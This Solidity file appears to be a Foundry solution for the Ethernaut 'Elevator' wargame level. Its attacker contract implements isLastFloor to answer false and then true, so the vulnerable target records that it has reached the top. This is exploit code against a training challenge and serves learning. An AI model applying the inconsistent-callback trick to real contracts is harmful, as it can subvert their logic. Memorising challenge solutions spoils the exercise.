// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Elevator} from "../../src/ethernaut/11_Elevator/Elevator.sol";

contract Elevator_Attacker {
	address player;
	Elevator coreInst;
	
	bool isTop = false;
	
	constructor(Elevator coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		coreInst.goTo(0);
	}
	
	function isLastFloor(uint256) external returns (bool) {
		if (!isTop) {
			isTop = true;
			return false;
		} else {
			return true;
		}
	}
}
